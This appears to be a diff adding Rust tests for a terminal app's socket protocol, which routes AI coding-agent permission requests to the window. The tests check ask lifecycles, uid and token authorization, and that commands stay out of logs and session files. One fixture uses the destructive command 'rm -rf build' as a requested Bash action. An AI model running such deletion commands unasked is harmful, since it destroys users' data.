+        assert_eq!(served.ended(id), Some(How::Ended(Cause::HookGone)));
+        assert_eq!(served.asks(), 0);
+    }
+
+    #[test]
+    fn an_ask_ends_with_pass_when_its_pane_closes_its_command_ends_or_its_turn_does() {
+        let mut served = Served::new(|workspace, ctx, _| {
+            workspace.apply(TabAction::New, ctx);
+        });
+        let (first, second) = served.read(|workspace, _| {
+            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
+            (panes.next().expect("one"), panes.next().expect("two"))
+        });
+        let tty = served.tty(first);
+
+        // The agent says its turn is over.
+        let (mut client, reply) = served.ask_as(question("s1", tty, "ls"), None);
+        let id = held(&reply);
+        served.report(first, AgentStatus::Idle, None);
+        assert_eq!(client.answer(), pass("turn-ended"));
+        assert_eq!(served.ended(id), Some(How::Ended(Cause::TurnEnded)));
+
+        // Or that it failed.
+        let (mut client, reply) = served.ask_as(question("s1", tty, "ls"), None);
+        let id = held(&reply);
+        served.report(first, AgentStatus::Failed, Some("You've hit your limit"));
+        assert_eq!(client.answer(), pass("turn-ended"));
+        assert_eq!(served.ended(id), Some(How::Ended(Cause::TurnEnded)));
+
+        // Its command ends, taking the agent's report back.
+        let (mut client, reply) = served.ask_as(question("s1", tty, "ls"), None);
+        let id = held(&reply);
+        served.report(
+            first,
+            AgentStatus::NeedsInput,
+            Some("permission to use Bash"),
+        );
+        served.update(|workspace, ctx| {
+            workspace.apply_terminal_update(&TerminalUpdate::AgentSettled(first), ctx);
+        });
+        assert_eq!(client.answer(), pass("command-ended"));
+        assert_eq!(served.ended(id), Some(How::Ended(Cause::CommandEnded)));
+
+        // Its pane closes.
+        let (mut client, reply) = served.ask_as(question("s1", served.tty(second), "ls"), None);
+        let id = held(&reply);
+        served.update(|workspace, ctx| {
+            workspace.apply(TabAction::ClosePane(second), ctx);
+        });
+        assert_eq!(client.answer(), pass("pane-closed"));
+        assert_eq!(served.ended(id), Some(How::Ended(Cause::PaneClosed)));
+        assert_eq!(served.asks(), 0);
+        // And the connection closes after the one answer.
+        assert_eq!(client.raw(), None);
+    }
+
+    #[test]
+    fn an_ask_ends_with_pass_when_its_wait_runs_out() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let (client, reply) = served.ask_as(
+            AgentAsk {
+                wait: 1,
+                ..question("s1", served.tty(pane), "ls")
+            },
+            None,
+        );
+        let id = held(&reply);
+        let started = Instant::now();
+        // The hook's read, on a thread of its own, while the window runs.
+        let reading = thread::spawn(move || {
+            let mut client = client;
+            client.answer()
+        });
+        served.pump_until("the question never expired", |served| {
+            served.ended(id).is_some()
+        });
+        assert_eq!(reading.join().expect("the hook"), pass("expired"));
+        assert_eq!(served.ended(id), Some(How::Ended(Cause::Expired)));
+        let took = started.elapsed();
+        assert!(
+            took >= Duration::from_secs(1) + server::ASK_MARGIN - Duration::from_millis(500),
+            "expired early: {took:?}"
+        );
+    }
+
+    #[test]
+    fn an_ask_ends_with_gone_when_the_window_closes() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let (mut client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
+        held(&reply);
+        // Held past the time the connection had to be asked in, as every
+        // question a person takes a moment over is.
+        thread::sleep(server::DEADLINE + Duration::from_millis(500));
+        let Served {
+            window, control, ..
+        } = served;
+        drop(control);
+        let reply = client.reply().expect("told, not hung up on");
+        assert_eq!(refused(&reply), code::GONE);
+        drop(window);
+    }
+
+    #[test]
+    fn an_ask_survives_the_titles_asterisk_and_a_running_report() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        served.report(pane, AgentStatus::Running, None);
+        let (_client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
+        held(&reply);
+        // The `✳` Claude Code draws as the dialog opens is the moment it
+        // asks; a parallel tool's hook still says running; the notification
+        // that asks comes after.
+        served.titled(pane, "✳ Port the tab bar");
+        served.report(pane, AgentStatus::Running, None);
+        served.titled(pane, "✳ Port the tab bar");
+        served.report(
+            pane,
+            AgentStatus::NeedsInput,
+            Some("permission to use Bash"),
+        );
+        assert_eq!(served.asks(), 1, "the question is still being asked");
+    }
+
+    #[test]
+    fn a_token_naming_another_tab_or_a_stranger_pid_makes_it_read_only() {
+        let mut served = Served::new(|workspace, ctx, _| {
+            workspace.apply(TabAction::New, ctx);
+        });
+        let (first, second) = served.read(|workspace, _| {
+            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
+            (panes.next().expect("one"), panes.next().expect("two"))
+        });
+        let tty = served.tty(first);
+
+        // This test is no process of the pane's shell.
+        let (_stranger, reply) = served.ask_as(question("s1", tty, "ls"), None);
+        held(&reply);
+        let cannot = |served: &Served| {
+            served.read(|workspace, _| workspace.asks().in_pane(first).map(|ask| ask.cannot_answer))
+        };
+        assert_eq!(cannot(&served), Some(Some(CannotAnswer::NotFromThisTab)));
+        // Nor is a hook holding another pane's token, whichever it is.
+        let (_other, reply) = served.ask_as(question("s1", tty, "ls"), Some(served.token(second)));
+        held(&reply);
+        assert_eq!(cannot(&served), Some(Some(CannotAnswer::OtherTab)));
+        // The pane's own token is not enough on its own.
+        let (_own, reply) = served.ask_as(question("s1", tty, "ls"), Some(served.token(first)));
+        held(&reply);
+        assert_eq!(cannot(&served), Some(Some(CannotAnswer::NotFromThisTab)));
+
+        // What decides it, from what the kernel said: below the pane's shell,
+        // a pane here, its own token or none, is the only answerable one.
+        let shell = served
+            .read(|workspace, app| workspace.shell_pid(first, app))
+            .expect("the pane's shell");
+        let below = protocol::Asker {
+            pid: Some(4242),
+            lineage: vec![4242, shell, 1],
+        };
+        let stranger = protocol::Asker {
+            pid: Some(4242),
+            lineage: vec![4242, 1],
+        };
+        use super::super::ask::cannot_answer;
+        assert_eq!(cannot_answer(None, first, &below, Some(shell), false), None);
+        assert_eq!(
+            cannot_answer(Some(first), first, &below, Some(shell), false),
+            None
+        );
+        assert_eq!(
+            cannot_answer(Some(second), first, &below, Some(shell), false),
+            Some(CannotAnswer::OtherTab)
+        );
+        assert_eq!(
+            cannot_answer(None, first, &stranger, Some(shell), false),
+            Some(CannotAnswer::NotFromThisTab)
+        );
+        assert_eq!(
+            cannot_answer(None, first, &below, None, false),
+            Some(CannotAnswer::NotFromThisTab),
+            "a pane whose shell cannot be named"
+        );
+        assert_eq!(
+            cannot_answer(None, first, &below, Some(shell), true),
+            Some(CannotAnswer::Remote)
+        );
+    }
+
+    #[test]
+    fn with_answering_off_an_ask_is_declined() {
+        let mut served = Served::new(|workspace, ctx, _| {
+            workspace.take_agents_questions(false, ctx);
+        });
+        let pane = first_pane(&served);
+        let (_client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
+        assert_eq!(refused(&reply), code::DECLINED);
+        assert_eq!(served.asks(), 0);
+        // Before anything about the panes is said: a terminal no pane is on
+        // is declined too.
+        let (_client, reply) = served.ask_as(question("s1", 7, "ls"), None);
+        assert_eq!(refused(&reply), code::DECLINED);
+    }
+
+    /// A conversation answered as a window would whose user is `uid`, asking
+    /// `answer`: the listener's side, for a uid no test can connect as.
+    fn conversation_as(answer: Answer, uid: u32) -> (Client, thread::JoinHandle<()>) {
+        let lanes = Arc::new(Lanes::default());
+        let (client, window) = UnixStream::pair().expect("a pair");
+        let mut place = Place::take(&lanes).expect("a place among the connections answered");
+        let answering = thread::spawn(move || {
+            server::converse_as(
+                &window,
+                Instant::now() + Duration::from_secs(5),
+                &*answer,
+                &mut place,
+                uid,
+            );
+        });
+        (Client::on(client), answering)
+    }
+
+    /// A window that holds every question as number 1, and keeps what it was
+    /// asked.
+    fn remembering() -> (Answer, Arc<std::sync::Mutex<Vec<Request>>>) {
+        let asked = Arc::new(std::sync::Mutex::new(Vec::new()));
+        let kept = asked.clone();
+        let answer: Answer = Arc::new(move |request: Request, _, _| {
+            kept.lock().expect("not poisoned").push(request);
+            Ok(json!({"asked": 1}))
+        });
+        (answer, asked)
+    }
+
+    #[test]
+    fn a_question_from_another_user_never_reaches_the_window() {
+        // Asked of a window whose user is the next uid up: the kernel says
+        // this test is not that user, and the question is refused on the
+        // connection's thread, before the window hears of it.
+        let (answer, asked) = remembering();
+        let (mut client, answering) = conversation_as(answer, server::euid() + 1);
+        client.send(&protocol::request_line(
+            &Verb::AgentAsk(agent_ask("ls")),
+            None,
+        ));
+        let reply = client.reply().expect("refused, not dropped");
+        assert_eq!(refused(&reply), code::UNAUTHORIZED);
+        assert!(
+            reply
+                .error
+                .expect("a refusal")
+                .message
+                .contains(&format!("uid {}", server::euid())),
+            "the refusal names who asked"
+        );
+        answering.join().expect("the connection's thread");
+        assert!(asked.lock().expect("not poisoned").is_empty());
+
+        // Asked as this user, the window is handed who asked, as the kernel
+        // said: this process, first in its own lineage.
+        let (answer, asked) = remembering();
+        let (mut client, answering) = conversation_as(answer, server::euid());
+        client.send(&protocol::request_line(
+            &Verb::AgentAsk(agent_ask("ls")),
+            None,
+        ));
+        held(&client.reply().expect("held"));
+        drop(client);
+        answering.join().expect("the connection's thread");
+        let asked = asked.lock().expect("not poisoned");
+        let asker = asked[0]
+            .asker
+            .as_ref()
+            .expect("the window is told who asked");
+        assert_eq!(asker.lineage.first(), Some(&std::process::id()));
+    }
+
+    #[test]
+    fn a_hook_is_heard_for_one_line_and_after_it_only_for_leaving() {
+        use super::super::ask::AskId;
+
+        let inbox = Arc::new(Inbox::default());
+        let telling = inbox.clone();
+        let answer: Answer = Arc::new(move |_, feed: Option<Arc<Feed>>, _| {
+            feed.expect("a question is asked on a kept connection")
+                .tell(Arc::downgrade(&telling));
+            Ok(json!({"asked": 1}))
+        });
+        let (mut client, answering) = conversation(answer, Duration::from_secs(5));
+        client.send(&protocol::request_line(
+            &Verb::AgentAsk(agent_ask("ls")),
+            None,
+        ));
+        held(&client.reply().expect("held"));
+
+        // A hook that says it printed its answer once, and then again and
+        // again: the window hears it once.
+        for _ in 0..64 {
+            client.send("{\"delivered\":true}\n");
+        }
+        let notices = || inbox.lock().notices.clone();
+        let started = Instant::now();
+        while notices().is_empty() {
+            assert!(started.elapsed() < Duration::from_secs(10), "never heard");
+            thread::sleep(Duration::from_millis(10));
+        }
+        // Long enough for every line after the first to have been read.
+        thread::sleep(Duration::from_millis(300));
+        assert_eq!(notices(), [Notice::Delivered(AskId::from_wire(1))]);
+
+        // And its leaving, once.
+        drop(client);
+        answering.join().expect("the connection's thread");
+        assert_eq!(
+            notices(),
+            [
+                Notice::Delivered(AskId::from_wire(1)),
+                Notice::Withdrawn(AskId::from_wire(1))
+            ]
+        );
+    }
+
+    #[test]
+    fn a_question_the_window_was_too_slow_to_hold_is_never_held() {
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let tty = served.tty(pane);
+        let socket = served.socket();
+        // Asked while the window draws nothing — a frame stalled for longer
+        // than the connection waits on it — so the connection gives up and
+        // the hook passes.
+        let asking = thread::spawn(move || hook(question("s1", tty, "ls"), None)(socket));
+        let (_client, reply) = asking.join().expect("the hook");
+        assert_eq!(refused(&reply), code::TIMEOUT);
+
+        // Then the window catches up, and is handed the question at last.
+        for _ in 0..5 {
+            served.window.queue.run_until_parked();
+            thread::sleep(Duration::from_millis(20));
+        }
+        // A settle, which drops a question nobody waits on: there is none,
+        // as there was never one held.
+        served.update(|workspace, ctx| {
+            workspace.apply(TabAction::New, ctx);
+        });
+        assert_eq!(served.asks(), 0);
+        served.read(|workspace, _| {
+            assert_eq!(
+                workspace.asks().history().count(),
+                0,
+                "a question was held after its hook had passed"
+            );
+        });
+    }
+
+    /// Set, for the test binary run again below a pane's shell, to say it is
+    /// to ask as the hook does.
+    #[cfg(any(target_os = "linux", target_os = "macos"))]
+    const CHILD_ASKS: &str = "CROOK_TEST_ASK_AS_A_HOOK";
+
+    /// The hook, run as Claude Code runs it in a pane: this test binary
+    /// again, started by the pane's shell, reading the request from its
+    /// standard input, with the pane's environment. Nothing unless the test
+    /// below started it.
+    #[cfg(any(target_os = "linux", target_os = "macos"))]
+    #[test]
+    #[ignore = "run by a_hook_below_the_panes_shell_asks_a_question_the_window_could_answer"]
+    fn asks_as_a_hook_below_a_panes_shell() {
+        if std::env::var_os(CHILD_ASKS).is_some() {
+            crate::agent::ask::run(std::iter::once("claude".to_owned()));
+        }
+    }
+
+    #[cfg(any(target_os = "linux", target_os = "macos"))]
+    #[test]
+    fn a_hook_below_the_panes_shell_asks_a_question_the_window_could_answer() {
+        use std::os::unix::ffi::OsStrExt;
+
+        let root = TempDir::new();
+        let gate = root.0.join("gate");
+        let input = root.0.join("input.json");
+        fs::write(
+            &input,
+            json!({
+                "session_id": "4f1c2b7e-0d3a-4e5f-9a8b-7c6d5e4f3a2b",
+                "cwd": "/home/someone/work/crook",
+                "hook_event_name": "PermissionRequest",
+                "tool_name": "Bash",
+                "tool_input": {"command": "rm -rf build"},
+            })
+            .to_string(),
+        )
+        .expect("the input is written");
+        let binary = std::env::current_exe().expect("the test binary has a path");
+        let quoted = |path: &Path| {
+            let text = std::str::from_utf8(path.as_os_str().as_bytes()).expect("text");
+            assert!(!text.contains('\''), "a path the script can quote: {text}");
+            format!("'{text}'")
+        };
+        // The pane's shell runs the hook as a child of its own, as an
+        // agent's would be a grandchild, out of any multiplexer the suite
+        // runs in, and is then a pane like any other.
+        let program = root.0.join("sh");
+        crate::process::write_program(
+            &program,
+            &format!(
+                "#!/bin/sh\n\
+                 while [ ! -e {gate} ]; do sleep 0.1; done\n\
+                 TMUX= STY= ZELLIJ= CLAUDE_CODE_ENTRYPOINT=cli {CHILD_ASKS}=1 {binary} --exact \
+                 control::tests::socket::asks_as_a_hook_below_a_panes_shell --ignored \
+                 --test-threads=1 < {input}\n\
+                 exec cat\n",
+                gate = quoted(&gate),
+                binary = quoted(&binary),
+                input = quoted(&input),
+            ),
+        );
+        let shell = GatedShell { program, gate };
+        let mut served = Served::with(root, shell, |_, _, _| {});
+        let pane = first_pane(&served);
+        served.shell.open();
+
+        served.pump_until("the hook below the pane's shell never asked", |served| {
+            served.asks() == 1
+        });
+        let (id, shell) = served.read(|workspace, app| {
+            let ask = workspace.asks().in_pane(pane).expect("held in its pane");
+            assert_eq!(ask.request.command(), "rm -rf build");
+            assert_eq!(
+                ask.cannot_answer, None,
+                "a process the pane's shell started, with the pane's token, on the pane's \
+                 terminal, is one this window could answer"
+            );
+            (ask.id, workspace.shell_pid(pane, app))
+        });
+        assert!(shell.is_some(), "the pane's shell is running");
+
+        // Ended, so the hook passes and the shell goes on.
+        served.update(|workspace, _| {
+            workspace.asks_mut().end(id, Cause::TurnEnded);
+        });
+        assert_eq!(
+            served.ended(id.as_u64()),
+            Some(How::Ended(Cause::TurnEnded))
+        );
+    }
+
+    #[test]
+    fn neither_pane_list_events_nor_the_session_file_carry_the_command() {
+        const MARKER: &str = "crook-marker-7f3a9c";
+        let mut served = Served::new(|_, _, _| {});
+        let pane = first_pane(&served);
+        let token = served.token(pane);
+        let following = served.start(follow(Some(&token), Some(pane)));
+        served.pump_until("the stream never began", |served| served.following() == 1);
+
+        let (_client, reply) = served.ask_as(
+            question("s1", served.tty(pane), &format!("echo {MARKER}")),
+            Some(token.clone()),
+        );
+        held(&reply);
+        let listed = served.ask(|socket| cli::unix::listing(&socket, None, true, None));
+        let listed = listed.expect("listed");
+        assert!(!listed.contains(MARKER), "{listed}");
+        served.report(
+            pane,
+            AgentStatus::NeedsInput,
+            Some("permission to use Bash"),
+        );
+        served.read(|workspace, _| {
+            let ask = workspace.asks().in_pane(pane).expect("held");
+            assert!(ask.summary.contains(MARKER), "the row may say it");
+            let logged =
+                super::super::ask::log_line(ask, How::Ended(Cause::PaneClosed), Instant::now());
+            assert!(!logged.contains(MARKER), "{logged}");
+            assert!(logged.contains(&ask.fingerprint[..12]), "{logged}");
+        });
+
+        let listed = served.ask(|socket| cli::unix::listing(&socket, None, true, None));
+        let listed = listed.expect("listed");
+        assert!(!listed.contains(MARKER), "{listed}");
+        let session = served.read(|workspace, _| {
+            serde_json::to_string(&crate::session::Session::of(workspace.tabs(), None))
+                .expect("a session encodes")
+        });
+        assert!(!session.contains(MARKER), "{session}");
+
+        // The stream ends with the pane, and has said nothing of the command.
+        served.update(|workspace, ctx| {
+            workspace.apply(TabAction::New, ctx);
+        });
+        served.update(|workspace, ctx| {
+            workspace.apply(TabAction::ClosePane(pane), ctx);
+        });
+        let events = served.finish(following).expect("followed");
+        let said = format!("{events:?}");
+        assert!(!said.contains(MARKER), "{said}");
+        assert!(
+            events
+                .iter()
+                .any(|event| matches!(event, PaneEvent::Status { .. })),
+            "the stream did hear the pane: {said}"
+        );
     }
 }
